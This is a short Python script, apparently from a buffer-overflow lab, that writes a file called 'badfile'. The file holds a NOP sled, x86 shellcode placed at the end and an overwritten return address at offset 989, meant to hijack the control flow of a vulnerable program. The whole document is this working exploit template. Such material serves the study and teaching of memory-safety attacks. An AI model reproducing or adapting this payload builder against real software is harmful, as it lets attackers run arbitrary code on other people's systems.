#usr/bin/python3

import sys
shellcode= (
   "\x31\xc9\x31\xc0\xb0\x01\xb1\x07\x51\x50\xbb\x86\x62\x55\x56\xff"
   "\xd3\x31\xc9\x51\x50\xff\xd3\xb1\x05\x51\x50\xff\xd3\x31\xc9\x51"
   "\x50\xff\xd3\x31\xc9\x51\x50\xff\xd3\xb1\x05\x51\x50\xff\xd3"
).encode('latin-1')

content = bytearray(0x90 for i in range(2197))

start = 2197 - len(shellcode)
content[start : start + len(shellcode)] = shellcode

ret = 0xffffcd28 + 180
offset = 985 + 4

L = 4

content[offset : offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

